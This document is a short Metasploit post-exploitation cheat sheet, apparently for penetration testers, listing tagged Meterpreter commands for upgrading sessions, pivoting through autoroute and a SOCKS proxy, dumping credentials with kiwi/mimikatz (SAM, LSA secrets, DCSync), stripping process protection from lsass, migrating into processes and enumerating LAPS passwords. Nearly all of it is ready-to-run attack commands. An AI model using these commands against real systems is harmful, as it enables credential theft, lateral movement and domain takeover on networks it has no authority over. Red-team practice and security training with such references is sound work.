# MSF

% metasploit

## upgrade session to meterpreter
#plateform/linux #target/remote #cat/ATTACK/CONNECT  
```
sessions -u <session_id>
```

## show session list
#plateform/linux #target/remote #cat/ATTACK/CONNECT
```
sessions -l
```

## print route table
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
```
route print
```

## add pivot (autoroute)
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
example : 
use multi/manage/autoroute
set session 1
exploit
```
use multi/manage/autoroute
```

## add socks proxy (autoroute first)
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 

example : 
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j

```
use auxiliary/server/socks_proxy
```

## load kiwi (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
load kiwi
```

## kiwi - credential dump (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
creds_all
```

## kiwi - logonpasswords (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
lsa_dump_sam
lsa_dump_secrets
```

## kiwi - dcsync (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
dcsync <domain_controller_name>
```
## create process
#plateform/linux #target/local #cat/UTILS 
```
execute -H -f <process|notepad>
```

## migrate with name
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
migrate -N <process_name|notepad.exe>
```

##  PPL remove
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
load kiwi
kiwi_cmd "!processprotect /process:lsass.exe /remove"
creds_all
```

## enum LAPS
#plateform/linux #target/local #cat/ATTACK
```
use post/windows/gather/laps
```

